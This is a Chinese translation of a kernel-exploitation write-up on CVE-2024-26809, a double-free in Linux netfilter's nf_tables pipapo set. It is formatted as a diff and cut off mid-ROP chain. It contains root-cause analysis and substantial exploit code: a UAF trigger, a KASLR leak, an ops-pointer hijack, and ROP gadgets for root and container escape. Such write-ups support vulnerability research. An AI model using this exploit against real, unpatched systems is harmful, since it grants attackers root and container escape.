@@ -14,7 +14,7 @@ KernelCTF VRP[1]
   
 在研究过程中，我很快发现了 netfilter 中一个已修复的可利用漏洞，该漏洞被标记为 CVE-2024-26809（最初由  
 lonial con[2]  
- 发现）。我成功地在 KernelCTF LTS 实例中利用了这个漏洞，并编写了一个通用型漏洞利用程序，该程序可以在不同的内核版本中运行，无需重新编译不同的符号或 ROP 小工具。  
+ 发现）。我成功地在 KernelCTF LTS 实例中利用了这个漏洞，并编写了一个通用型漏洞利用程序，该程序可以在不同的内核版本中运行，无需重新编译不同的符号或 ROP 小工具。  
   
 在这篇文章中，我将讨论如何通过快速利用补丁差异来开发一个一天漏洞利用程序，在补丁下发之前获得类似零日漏洞的本地提权/容器逃逸能力，这种能力持续了大约两个月。我还将分享我分析补丁以理解漏洞的过程，定位引入该漏洞的提交，在 KernelCTF VRP 中利用它，最后，我是如何开发一个通用型漏洞利用程序来针对主流发行版的。  
 ## 内核  
@@ -39,27 +39,27 @@ lonial con[2]
 ## nf_tables  
   
 nf_tables  
- 是 Linux 内核 netfilter 子系统的一个组件。它是一个数据包过滤机制，是目前 iptables 和 Firewalld 等工具使用的后端。其内部结构已被其他研究人员详细讨论过  
+ 是 Linux 内核 netfilter 子系统的一个组件。它是一个数据包过滤机制，是目前 iptables 和 Firewalld 等工具使用的后端。其内部结构已被其他研究人员详细讨论过  
 1[4]  
 ,  
 2[5]  
 。我建议简要阅读这些文章以了解nf_table  
- 对象的层次结构以及如何操作它们来创建可配置的过滤机制。  
+ 对象的层次结构以及如何操作它们来创建可配置的过滤机制。  
   
 为了本文的简洁性，我将省略任何与漏洞不直接相关的细节。  
 ### 事务  
   
 事务是更新nf_tables  
- 对象/状态的交互。它大致由一批修改nf_tables  
- 对象的操作组成（添加/删除/编辑表、集合、元素、对象等）。它们大致由 3 个不同的阶段组成：  
+ 对象/状态的交互。它大致由一批修改nf_tables  
+ 对象的操作组成（添加/删除/编辑表、集合、元素、对象等）。它们大致由 3 个不同的阶段组成：  
 - **控制平面**  
- 准备每个操作，如果某些操作失败，则中止整个批处理；否则，提交整个批处理。  
+ 准备每个操作，如果某些操作失败，则中止整个批处理；否则，提交整个批处理。  
   
 - **提交路径**  
- 在控制平面之后，如果全部成功，我们应用更改（实际修改表、集合等）。  
+ 在控制平面之后，如果全部成功，我们应用更改（实际修改表、集合等）。  
   
 - **中止路径**  
- 仅在控制平面检测到错误条件时触发；撤销控制平面期间完成的操作并跳过提交。  
+ 仅在控制平面检测到错误条件时触发；撤销控制平面期间完成的操作并跳过提交。  
   
 ## 漏洞详情  
   
@@ -68,87 +68,87 @@ nf_tables
 。  
 ```
 diff --git a/net/netfilter/nft_set_pipapo.c b/net/netfilter/nft_set_pipapo.c
-index c0ceea068936a6..df8de509024637 100644
+index c0ceea068936a6..df8de509024637 100644
 --- a/net/netfilter/nft_set_pipapo.c
 +++ b/net/netfilter/nft_set_pipapo.c
-@@ -2329,8 +2329,6 @@ static void nft_pipapo_destroy(const struct nft_ctx *ctx,
+@@ -2329,8 +2329,6 @@ static void nft_pipapo_destroy(const struct nft_ctx *ctx,
 
-        m = rcu_dereference_protected(priv->match, true);
+        m = rcu_dereference_protected(priv->match, true);
 
-  if (m) {
-   rcu_barrier();
+  if (m) {
+   rcu_barrier();
 
--  nft_set_pipapo_match_destroy(ctx, set, m);
+-  nft_set_pipapo_match_destroy(ctx, set, m);
 -
-   for_each_possible_cpu(cpu)
-    pipapo_free_scratch(m, cpu);
-   free_percpu(m->scratch);
-@@ -2342,8 +2340,7 @@ static void nft_pipapo_destroy(const struct nft_ctx *ctx,
-  if (priv->clone) {
-   m = priv->clone;
+   for_each_possible_cpu(cpu)
+    pipapo_free_scratch(m, cpu);
+   free_percpu(m->scratch);
+@@ -2342,8 +2340,7 @@ static void nft_pipapo_destroy(const struct nft_ctx *ctx,
+  if (priv->clone) {
+   m = priv->clone;
 
--  if (priv->dirty)
--   nft_set_pipapo_match_destroy(ctx, set, m);
-+  nft_set_pipapo_match_destroy(ctx, set, m);
+-  if (priv->dirty)
+-   nft_set_pipapo_match_destroy(ctx, set, m);
++  nft_set_pipapo_match_destroy(ctx, set, m);
 
-   for_each_possible_cpu(cpu)
-    pipapo_free_scratch(priv->clone, cpu);
+   for_each_possible_cpu(cpu)
+    pipapo_free_scratch(priv->clone, cpu);
 ```  
 ```
 static void nft_set_pipapo_match_destroy(const struct nft_ctx *ctx,
-      const struct nft_set *set,
-      struct nft_pipapo_match *m)
+      const struct nft_set *set,
+      struct nft_pipapo_match *m)
 {
- struct nft_pipapo_field *f;
- int i, r;
+ struct nft_pipapo_field *f;
+ int i, r;
 
- for (i = 0, f = m->f; i < m->field_count - 1; i++, f++)
-  ;
+ for (i = 0, f = m->f; i < m->field_count - 1; i++, f++)
+  ;
 
- for (r = 0; r < f->rules; r++) {
-  struct nft_pipapo_elem *e;
+ for (r = 0; r < f->rules; r++) {
+  struct nft_pipapo_elem *e;
 
-  if (r < f->rules - 1 && f->mt[r + 1].e == f->mt[r].e)
-   continue;
+  if (r < f->rules - 1 && f->mt[r + 1].e == f->mt[r].e)
+   continue;
 
-  e = f->mt[r].e;
+  e = f->mt[r].e;
 
-  nf_tables_set_elem_destroy(ctx, set, &e->priv);
- }
+  nf_tables_set_elem_destroy(ctx, set, &e->priv);
+ }
 }
 ```  
 ```
 void nf_tables_set_elem_destroy(const struct nft_ctx *ctx,
-    const struct nft_set *set,
-    const struct nft_elem_priv *elem_priv)
+    const struct nft_set *set,
+    const struct nft_elem_priv *elem_priv)
 {
- struct nft_set_ext *ext = nft_set_elem_ext(set, elem_priv);
+ struct nft_set_ext *ext = nft_set_elem_ext(set, elem_priv);
 
- if (nft_set_ext_exists(ext, NFT_SET_EXT_EXPRESSIONS))
-  nft_set_elem_expr_destroy(ctx, nft_set_ext_expr(ext));
+ if (nft_set_ext_exists(ext, NFT_SET_EXT_EXPRESSIONS))
+  nft_set_elem_expr_destroy(ctx, nft_set_ext_expr(ext));
 
- kfree(elem_priv);
+ kfree(elem_priv);
 }
 ```  
 ### 根因分析  
   
 对于已经提交的setelem  
- 而言，由于它们具有重复的视图，因此对两个匹配对象都调用nf_tables_set_elem_destroy  
- 会导致一个明显的双重释放漏洞。乍看之下，这段代码的实现非常奇怪。那么这个漏洞是如何产生的？为什么之前没有被发现？让我们深入分析一下。  
+ 而言，由于它们具有重复的视图，因此对两个匹配对象都调用nf_tables_set_elem_destroy  
+ 会导致一个明显的双重释放漏洞。乍看之下，这段代码的实现非常奇怪。那么这个漏洞是如何产生的？为什么之前没有被发现？让我们深入分析一下。  
   
 我们现在需要理解如何触发设置了priv->dirty  
- 标志的代码路径。这个标志是 pipaposetelem  
- 私有数据的一个成员，当在事务的控制平面传递期间对set  
- 进行更改时，该标志会被设置为 true。这是为了告诉提交路径该set  
- 有需要提交的更改。通过查看代码，我们可以发现通过插入新元素可以使set  
- 变为 dirty 状态。  
+ 标志的代码路径。这个标志是 pipaposetelem  
+ 私有数据的一个成员，当在事务的控制平面传递期间对set  
+ 进行更改时，该标志会被设置为 true。这是为了告诉提交路径该set  
+ 有需要提交的更改。通过查看代码，我们可以发现通过插入新元素可以使set  
+ 变为 dirty 状态。  
 ```
 static int nft_pipapo_insert(const struct net *net, const struct nft_set *set,
-        const struct nft_set_elem *elem,
-        struct nft_elem_priv **elem_priv)
+        const struct nft_set_elem *elem,
+        struct nft_elem_priv **elem_priv)
 {
 [...]
- priv->dirty = true;
+ priv->dirty = true;
 [...]
 }
 ```  
@@ -156,89 +156,89 @@ static int nft_pipapo_insert(const struct net *net, const struct nft_set *set,
 static void nft_pipapo_commit(struct nft_set *set)
 {
 [...]
- if (!priv->dirty)
-  return;
+ if (!priv->dirty)
+  return;
 [...]
- priv->dirty = false;
+ priv->dirty = false;
 [...]
 }
 ```  
   
 让我们再次查看代码，看看这些方法是如何被调用的。  
 ```
-static int nf_tables_commit(struct net *net, struct sk_buff *skb)
+static int nf_tables_commit(struct net *net, struct sk_buff *skb)
 {
 [...]
-  case NFT_MSG_DELSET:
-  case NFT_MSG_DESTROYSET: // [1]
-   nft_trans_set(trans)->dead = 1; // [2]
-   list_del_rcu(&nft_trans_set(trans)->list);
-   nf_tables_set_notify(&trans->ctx, nft_trans_set(trans),
-          trans->msg_type, GFP_KERNEL);
-   break;
-  case NFT_MSG_NEWSETELEM: // [3]
+  case NFT_MSG_DELSET:
+  case NFT_MSG_DESTROYSET: // [1]
+   nft_trans_set(trans)->dead = 1; // [2]
+   list_del_rcu(&nft_trans_set(trans)->list);
+   nf_tables_set_notify(&trans->ctx, nft_trans_set(trans),
+          trans->msg_type, GFP_KERNEL);
+   break;
+  case NFT_MSG_NEWSETELEM: // [3]
 [...]
-   if (te->set->ops->commit &&
-       list_empty(&te->set->pending_update)) {
-    list_add_tail(&te->set->pending_update,
-           &set_update_list);
-   }
+   if (te->set->ops->commit &&
+       list_empty(&te->set->pending_update)) {
+    list_add_tail(&te->set->pending_update,
+           &set_update_list);
+   }
 [...]
- }
+ }
 
- nft_set_commit_update(&set_update_list);
+ nft_set_commit_update(&set_update_list);
 [...]
- nf_tables_commit_release(net);
+ nf_tables_commit_release(net);
 
- return 0;
+ return 0;
 }
 ```  
 ```
 static void nft_set_commit_update(struct list_head *set_update_list)
 {
- struct nft_set *set, *next;
+ struct nft_set *set, *next;
 
- list_for_each_entry_safe(set, next, set_update_list, pending_update) {
-  list_del_init(&set->pending_update);
+ list_for_each_entry_safe(set, next, set_update_list, pending_update) {
+  list_del_init(&set->pending_update);
 
-  if (!set->ops->commit || set->dead) // [4]
-   continue;
+  if (!set->ops->commit || set->dead) // [4]
+   continue;
 
-  set->ops->commit(set); // [5]
- }
+  set->ops->commit(set); // [5]
+ }
 }
 ```  
 ```
 static void nf_tables_commit_release(struct net *net)
 {
 [...]
- schedule_work(&trans_destroy_work);
+ schedule_work(&trans_destroy_work);
 [...]
 }
 [...]
 static void nf_tables_trans_destroy_work(struct work_struct *w)
 {
 [...]
- list_for_each_entry_safe(trans, next, &head, list) {
-  nft_trans_list_del(trans);
-  nft_commit_release(trans);
- }
+ list_for_each_entry_safe(trans, next, &head, list) {
+  nft_trans_list_del(trans);
+  nft_commit_release(trans);
+ }
 }
 [...]
 static void nft_commit_release(struct nft_trans *trans)
 {
- switch (trans->msg_type) {
+ switch (trans->msg_type) {
 [...]
- case NFT_MSG_DELSET:
- case NFT_MSG_DESTROYSET:
-  nft_set_destroy(&trans->ctx, nft_trans_set(trans));
+ case NFT_MSG_DELSET:
+ case NFT_MSG_DESTROYSET:
+  nft_set_destroy(&trans->ctx, nft_trans_set(trans));
 [...]
 }
 [...]
 static void nft_set_destroy(const struct nft_ctx *ctx, struct nft_set *set)
 {
 [...]
- set->ops->destroy(ctx, set);
+ set->ops->destroy(ctx, set);
 [...]
 }
 ```  
@@ -255,26 +255,26 @@ static void nft_set_destroy(const struct nft_ctx *ctx, struct nft_set *set)
   
 通过阅读第一个提交的信息，我们终于可以理解为什么要添加这段代码：  
 ```
-New elements that reside in the clone are not released in case that the
+New elements that reside in the clone are not released in case that the
 transaction is aborted.
 
-[16302.231754] ------------[ cut here ]------------
+[16302.231754] ------------[ cut here ]------------
 [16302.231756] WARNING: CPU: 0 PID: 100509 at net/netfilter/nf_tables_api.c:1864 nf_tables_chain_destroy+0x26/0x127 [nf_tables]
 [...]
-[16302.231882] CPU: 0 PID: 100509 Comm: nft Tainted: G        W         5.19.0-rc3+ #155
+[16302.231882] CPU: 0 PID: 100509 Comm: nft Tainted: G        W         5.19.0-rc3+ #155
 [...]
 [16302.231887] RIP: 0010:nf_tables_chain_destroy+0x26/0x127 [nf_tables]
 [16302.231899] Code: f3 fe ff ff 41 55 41 54 55 53 48 8b 6f 10 48 89 fb 48 c7 c7 82 96 d9 a0 8b 55 50 48 8b 75 58 e8 de f5 92 e0 83 7d 50 00 74 09 <0f> 0b 5b 5d 41 5c 41 5d c3 4c 8b 65 00 48 8b 7d 08 49 39 fc 74 05
 [...]
 [16302.231917] Call Trace:
-[16302.231919]  <TASK>
-[16302.231921]  __nf_tables_abort.cold+0x23/0x28 [nf_tables]
-[16302.231934]  nf_tables_abort+0x30/0x50 [nf_tables]
-[16302.231946]  nfnetlink_rcv_batch+0x41a/0x840 [nfnetlink]
-[16302.231952]  ? __nla_validate_parse+0x48/0x190
-[16302.231959]  nfnetlink_rcv+0x110/0x129 [nfnetlink]
-[16302.231963]  netlink_unicast+0x211/0x340
-[16302.231969]  netlink_sendmsg+0x21e/0x460
+[16302.231919]  <TASK>
+[16302.231921]  __nf_tables_abort.cold+0x23/0x28 [nf_tables]
+[16302.231934]  nf_tables_abort+0x30/0x50 [nf_tables]
+[16302.231946]  nfnetlink_rcv_batch+0x41a/0x840 [nfnetlink]
+[16302.231952]  ? __nla_validate_parse+0x48/0x190
+[16302.231959]  nfnetlink_rcv+0x110/0x129 [nfnetlink]
+[16302.231963]  netlink_unicast+0x211/0x340
+[16302.231969]  netlink_sendmsg+0x21e/0x460
 
 Add nft_set_pipapo_match_destroy() helper function to release the
 elements in the lookup tables.
@@ -291,15 +291,15 @@ Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
 ```  
   
 这种情况在提交路径中并不合理，只在中止路径中有意义。显然，当中止创建set  
- 的事务时，不会有任何已提交的更改，只有克隆集中的元素最终不会被提交。因此，为了确保释放这些未提交的元素，释放克隆中的内容至关重要。  
+ 的事务时，不会有任何已提交的更改，只有克隆集中的元素最终不会被提交。因此，为了确保释放这些未提交的元素，释放克隆中的内容至关重要。  
   
 当引入这段代码时，它只能从中止路径到达，因为这是唯一一条在不清除priv->dirty  
- 标志的情况下可以调用set->ops->destroy()  
- 的路径。考虑到当时没有重复的setelem  
- 视图，所有元素都在克隆集中，这种设计是合理的。  
+ 标志的情况下可以调用set->ops->destroy()  
+ 的路径。考虑到当时没有重复的setelem  
+ 视图，所有元素都在克隆集中，这种设计是合理的。  
   
 但是当引入set->dead  
- 标志时，一些关于提交路径的假设发生了改变。它创造了一种新的方式来访问这段代码，同时已经在集合中提交了更改。这意味着任何已提交的更改都会在"普通"匹配对象和克隆中各有一个视图。  
+ 标志时，一些关于提交路径的假设发生了改变。它创造了一种新的方式来访问这段代码，同时已经在集合中提交了更改。这意味着任何已提交的更改都会在"普通"匹配对象和克隆中各有一个视图。  
   
 这个漏洞最终通过仅从克隆中删除元素得到修复，因为克隆应该包含已提交和未提交更改的所有视图，从而有效地消除了双重释放漏洞。  
 ## KernelCTF 漏洞利用  
@@ -307,12 +307,12 @@ Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
 现在我们已经了解了这个漏洞的完整故事，让我们来看看在深入研究通用漏洞利用之前，我是如何在 KernelCTF LTS 实例中利用它的。漏洞利用的很大一部分是基于 lonial con 在  
 之前的 kernelCTF 漏洞利用[10]  
 中分享的nft_object + udata  
- 技术。  
+ 技术。  
 ### 触发 UAF/避免双重释放检测  
   
 SLUB 分配器有一个简单的双重释放检测机制，用于发现直接的序列，比如同一个对象在没有其他对象添加到空闲列表的情况下被连续添加两次。正如我们所见，nft_set_pipapo_match_destroy  
- 会遍历集合中的setelems  
- 并释放每一个，所以通过在集合中放置多个元素来避免检测应该相对简单，这种情况下会发生以下情况：  
+ 会遍历集合中的setelems  
+ 并释放每一个，所以通过在集合中放置多个元素来避免检测应该相对简单，这种情况下会发生以下情况：  
 1. 元素 A 被释放  
   
 1. 元素 B 被释放  
@@ -326,223 +326,223 @@ SLUB 分配器有一个简单的双重释放检测机制，用于发现直接的
 static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
 {
 [...]
-    // TRANSACTION 2
+    // TRANSACTION 2
 [...]
 
-    // create pipapo set
-    uint8_t desc[2] = {16, 16};
-    set = create_set(
-        batch, seq++, exploit_table_name, "pwn_set", 0x1337,
-        NFT_SET_INTERVAL | NFT_SET_OBJECT | NFT_SET_CONCAT, KEY_LEN, 2, &desc, NULL, 0, NFT_OBJECT_CT_EXPECT);
+    // create pipapo set
+    uint8_t desc[2] = {16, 16};
+    set = create_set(
+        batch, seq++, exploit_table_name, "pwn_set", 0x1337,
+        NFT_SET_INTERVAL | NFT_SET_OBJECT | NFT_SET_CONCAT, KEY_LEN, 2, &desc, NULL, 0, NFT_OBJECT_CT_EXPECT);
 
-    // commit 2 elems to set (elems A and B that will be double-freed)
-    for (int i = 0; i < 2; i++)
-    {
-        elem[i] = nftnl_set_elem_alloc();
-        memset(key, 0x41 + i, KEY_LEN);
-        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
-        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
-        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_USERDATA, &udata_buf, size);
-        nftnl_set_elem_add(set, elem[i]);
-    }
+    // commit 2 elems to set (elems A and B that will be double-freed)
+    for (int i = 0; i < 2; i++)
+    {
+        elem[i] = nftnl_set_elem_alloc();
+        memset(key, 0x41 + i, KEY_LEN);
+        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
+        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
+        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_USERDATA, &udata_buf, size);
+        nftnl_set_elem_add(set, elem[i]);
+    }
 [...]
 
-    // TRANSACTION 3
+    // TRANSACTION 3
 [...]
-    set = nftnl_set_alloc();
-    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
-    nftnl_set_set_str(set, NFTNL_SET_TABLE, exploit_table_name);
-    nftnl_set_set_str(set, NFTNL_SET_NAME, "pwn_set");
+    set = nftnl_set_alloc();
+    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
+    nftnl_set_set_str(set, NFTNL_SET_TABLE, exploit_table_name);
+    nftnl_set_set_str(set, NFTNL_SET_NAME, "pwn_set");
 
-    // make priv->dirty true
-    memset(key, 0xff, KEY_LEN);
-    elem[3] = nftnl_set_elem_alloc();
-    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
-    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
-    nftnl_set_elem_add(set, elem[3]);
+    // make priv->dirty true
+    memset(key, 0xff, KEY_LEN);
+    elem[3] = nftnl_set_elem_alloc();
+    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
+    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
+    nftnl_set_elem_add(set, elem[3]);
 [...]
 
-    // double-free commited elems
+    // double-free commited elems
 [...]
-    nftnl_set_free(set);
+    nftnl_set_free(set);
 }
 [...]
 ```  
   
 表中包含一个可读写的外部用户数据缓冲区udata  
 。通过在双重释放的槽位上分配一个udata  
- 缓冲区，并使其与nft_object  
- 重叠，我们可以泄露->ops  
- 指针，并利用它来计算 KASLR 偏移量。  
+ 缓冲区，并使其与nft_object  
+ 重叠，我们可以泄露->ops  
+ 指针，并利用它来计算 KASLR 偏移量。  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCN0894z7ZxrG2WgnbLL21kSUdyzBpFVXUpzb7ZSNSj2wruE6ial29rMaA3Iiccx0OibCgQkeQGT8ZFGw/640?wx_fmt=png&from=appmsg "")  
   
 ```
 [...]
-    // spray 3 udata buffers to consume elems A, B and A again
-    udata_spray(nl, 0xe8, 0, 3, NULL);
+    // spray 3 udata buffers to consume elems A, B and A again
+    udata_spray(nl, 0xe8, 0, 3, NULL);
 
-    // check if overlap happened (i.e if we have to overlapping udata buffers)
-    char spray_name[16];
-    char *udata[3];
-    for (int i = 0; i < 3; i++)
-    {
-        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
-        udata[i] = getudata(nl, spray_name);
-    }
-    if (udata[0][0] == udata[2][0])
-    {
-        puts("[+] got duplicated table");
-    }
+    // check if overlap happened (i.e if we have to overlapping udata buffers)
+    char spray_name[16];
+    char *udata[3];
+    for (int i = 0; i < 3; i++)
+    {
+        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
+        udata[i] = getudata(nl, spray_name);
+    }
+    if (udata[0][0] == udata[2][0])
+    {
+        puts("[+] got duplicated table");
+    }
 
-    // Replace one of the udata buffers with nft_object
-    // and read it's counterpart to leak the nft_object struct
-    puts("[*] Info leak");
-    deludata_spray(nl, 0, 1);
-    wait_destroyer();
-    obj_spray(nl, 0, 1, NULL, 0);
-    uint64_t *fake_obj = (uint64_t *)getudata(nl, "spray-2");
+    // Replace one of the udata buffers with nft_object
+    // and read it's counterpart to leak the nft_object struct
+    puts("[*] Info leak");
+    deludata_spray(nl, 0, 1);
+    wait_destroyer();
+    obj_spray(nl, 0, 1, NULL, 0);
+    uint64_t *fake_obj = (uint64_t *)getudata(nl, "spray-2");
 [...]
 ```  
   
 正如我将在 ROP 部分详细讨论的那样，漏洞利用需要一个已知的可控内存地址才能工作。我决定使用nft_object  
- 来获取它自己的地址。这是可行的，因为nft_object  
- 有一个udata  
- 指针（类似于我用来泄露 KASLR 的table->udata  
+ 来获取它自己的地址。这是可行的，因为nft_object  
+ 有一个udata  
+ 指针（类似于我用来泄露 KASLR 的table->udata  
 ），我可以用它来读写数据。  
   
 nft_object  
- 结构体还包含一个list_head  
+ 结构体还包含一个list_head  
 ，它被插入到一个循环链表中，该链表包含属于给定table  
- 的所有nft_object  
+ 的所有nft_object  
 。考虑到我们的对象目前在其表中是独立的，nft_object  
- 中的table->list.next  
- 指针将指回包含在table  
- 中的list_head  
+ 中的table->list.next  
+ 指针将指回包含在table  
+ 中的list_head  
 ，反之亦然。  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCN0894z7ZxrG2WgnbLL21kSQRRNciaziaLhP0fVhCxuygAI6Jf4RD6t7AHdRH26IfEtiafGAbz2nmBRw/640?wx_fmt=png&from=appmsg "")  
   
 简而言之，这意味着如果我们将nft_object  
- 的udata  
- 指针与它自己的list.next  
- 指针交换，我们应该能够读取一个指向nft_object  
- 的list_head  
- 的指针，这也是nft_object  
- 本身的起始位置。**注意：**  
- 这是一个新颖的小技巧。  
+ 的udata  
+ 指针与它自己的list.next  
+ 指针交换，我们应该能够读取一个指向nft_object  
+ 的list_head  
+ 的指针，这也是nft_object  
+ 本身的起始位置。**注意：**  
+ 这是一个新颖的小技巧。  
 ```
 [...]
-    // Leak nft_object ptr using table linked list
-    fake_obj[8] = 8;           // ulen = 8
-    fake_obj[9] = fake_obj[0]; // udata = list->next
-    deludata_spray(nl, 2, 1);
-    wait_destroyer();
-    udata_spray(nl, 0xe8, 3, 1, fake_obj);
+    // Leak nft_object ptr using table linked list
+    fake_obj[8] = 8;           // ulen = 8
+    fake_obj[9] = fake_obj[0]; // udata = list->next
+    deludata_spray(nl, 2, 1);
+    wait_destroyer();
+    udata_spray(nl, 0xe8, 3, 1, fake_obj);
 
-    get_obj(nl, "spray-0", true);
-    printf("[*] nft_object ptr: 0x%lx\n", obj_ptr);
+    get_obj(nl, "spray-0", true);
+    printf("[*] nft_object ptr: 0x%lx\n", obj_ptr);
 [...]
 ```  
   
 为了劫持控制流，我们可以再次使用nft_object  
 。nft_object  
- 结构体有一个指向函数指针表的ops  
- 指针。我们可以将ops  
- 指针与udata  
- 指针交换，从而控制指针表。  
+ 结构体有一个指向函数指针表的ops  
+ 指针。我们可以将ops  
+ 指针与udata  
+ 指针交换，从而控制指针表。  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCN0894z7ZxrG2WgnbLL21kSP1SMXxAM7Nt3vWEutsjrAfoTicLfZMKGlXRvp5gRAf2nGVXd19g94DA/640?wx_fmt=png&from=appmsg "")  
 ```
 [...]
-    // Fake ops
-    uint64_t *rop = calloc(29, sizeof(uint64_t));
-    rop[0] = kaslr_slide + 0xffffffff81988647; // push rsi; jmp qword ptr [rsi + 0x39];
-    rop[2] = kaslr_slide + NFT_CT_EXPECT_OBJ_TYPE;
+    // Fake ops
+    uint64_t *rop = calloc(29, sizeof(uint64_t));
+    rop[0] = kaslr_slide + 0xffffffff81988647; // push rsi; jmp qword ptr [rsi + 0x39];
+    rop[2] = kaslr_slide + NFT_CT_EXPECT_OBJ_TYPE;
 [...]
-    // Send ROP in object udata
-    del_obj(nl, "spray-0");
-    wait_destroyer();
-    obj_spray(nl, 1, 1, rop, 0xb8);
-    fake_obj = (uint64_t *)getudata(nl, "spray-3");
-    DumpHex(fake_obj, 0xe8);
-    uint64_t rop_addr = fake_obj[9]; // udata ptr
-    printf("[*] ROP addr: 0x%lx\n", rop_addr);
+    // Send ROP in object udata
+    del_obj(nl, "spray-0");
+    wait_destroyer();
+    obj_spray(nl, 1, 1, rop, 0xb8);
+    fake_obj = (uint64_t *)getudata(nl, "spray-3");
+    DumpHex(fake_obj, 0xe8);
+    uint64_t rop_addr = fake_obj[9]; // udata ptr
+    printf("[*] ROP addr: 0x%lx\n", rop_addr);
 
-    // Point to fake ops
-    fake_obj[16] = rop_addr - 0x20; // Point ops to fake ptr table
+    // Point to fake ops
+    fake_obj[16] = rop_addr - 0x20; // Point ops to fake ptr table
 [...]
-    // Write ROP
-    puts("[*] Write ROP");
-    deludata_spray(nl, 3, 1);
-    wait_destroyer();
-    udata_spray(nl, 0xe8, 4, 1, fake_obj);
+    // Write ROP
+    puts("[*] Write ROP");
+    deludata_spray(nl, 3, 1);
+    wait_destroyer();
+    udata_spray(nl, 0xe8, 4, 1, fake_obj);
 
-    // Takeover RIP
-    puts("[*] Takeover RIP");
-    dump_obj(nl, "spray-1");
+    // Takeover RIP
+    puts("[*] Takeover RIP");
+    dump_obj(nl, "spray-1");
 [...]
 ```  
   
 nft_object  
- 的操作是在 RCU 临界区中调用的，这对于 ROP 利用来说可能会产生问题，因为我们想要在执行完 payload 后切换到用户空间上下文，而这在 RCU 临界区中是不允许的。  
+ 的操作是在 RCU 临界区中调用的，这对于 ROP 利用来说可能会产生问题，因为我们想要在执行完 payload 后切换到用户空间上下文，而这在 RCU 临界区中是不允许的。  
   
 D3v17 在  
 之前的 kernelCTF 提交[11]  
 中讨论过一种解决方案，主要是使用内存写入小工具在切换到用户空间之前覆盖我们task_struct  
- 中的 RCU 锁。虽然这种方法可行，但我在寻找有用的小工具时遇到了困难，最终想出了一个更简单的解决方案。内核 API 中专门有用于获取/释放 RCU 锁的函数，因此我们应该可以在切换上下文之前简单地调用__rcu_read_unlock()  
- 函数并退出 RCU 临界区。  
+ 中的 RCU 锁。虽然这种方法可行，但我在寻找有用的小工具时遇到了困难，最终想出了一个更简单的解决方案。内核 API 中专门有用于获取/释放 RCU 锁的函数，因此我们应该可以在切换上下文之前简单地调用__rcu_read_unlock()  
+ 函数并退出 RCU 临界区。  
 ```
-    // ROP stage 1
-    int pos = 3;
+    // ROP stage 1
+    int pos = 3;
 
-    rop[pos++] = kaslr_slide + __RCU_READ_UNLOCK;
+    rop[pos++] = kaslr_slide + __RCU_READ_UNLOCK;
 ```  
   
 用于容器逃逸并获取 root 权限的大部分 ROP 链都是常规操作：  
 - commit_creds(&init_cred);  
- 为我们的进程提交 root 权限凭证  
+ 为我们的进程提交 root 权限凭证  
   
 - task = find_task_by_vpid(1);  
- 查找我们命名空间中的 root 进程  
+ 查找我们命名空间中的 root 进程  
   
 - switch_task_namespaces(task, &init_nsproxy);  
- 将其移动到 root 命名空间  
+ 将其移动到 root 命名空间  
   
 然而，我在寻找能够轻松地将find_task_by_vpid(1)  
- 通过rax  
- 传递的返回值移动到rdi  
- 的小工具时遇到了困难。最终我采用了一个push rax; jmp qword ptr [rsi + 0x66]; ret  
- 小工具，它允许我将rax  
- 值压入栈中，然后跳转到一个受控位置，在那里我存储了一个pop rdi; ret  
- 小工具来消费新的栈值并恢复正常的 ROP 执行。这个 ROP 流程中的微小绕道如下所示：  
+ 通过rax  
+ 传递的返回值移动到rdi  
+ 的小工具时遇到了困难。最终我采用了一个push rax; jmp qword ptr [rsi + 0x66]; ret  
+ 小工具，它允许我将rax  
+ 值压入栈中，然后跳转到一个受控位置，在那里我存储了一个pop rdi; ret  
+ 小工具来消费新的栈值并恢复正常的 ROP 执行。这个 ROP 流程中的微小绕道如下所示：  
 - 我们将值压入栈中（栈指针回退）  
   
 - 我们跳转到我们的"跳板"小工具（pop rdi; ret;  
- 位置）  
+ 位置）  
   
 - pop rdi; ret  
- 从栈中消费该值（将栈指针推进回应有的位置），然后我们跳回到下一个小工具  
+ 从栈中消费该值（将栈指针推进回应有的位置），然后我们跳回到下一个小工具  
   
 ```
 [...]
-    // commit_creds(&init_cred);
-    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
-    rop[pos++] = kaslr_slide + INIT_CRED;
-    rop[pos++] = kaslr_slide + COMMIT_CREDS;
+    // commit_creds(&init_cred);
+    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
+    rop[pos++] = kaslr_slide + INIT_CRED;
+    rop[pos++] = kaslr_slide + COMMIT_CREDS;
 
-    // task = find_task_by_vpid(1);
-    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
-    rop[pos++] = 1;
-    rop[pos++] = kaslr_slide + FIND_TASK_BY_VPID;
-    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
-    rop[pos++] = obj_ptr + 0xe0 - 0x66;            // rax -> rdi and resume rop
-    rop[pos++] = kaslr_slide + 0xffffffff81caed31; // push rax; jmp qword ptr [rsi + 0x66];
+    // task = find_task_by_vpid(1);
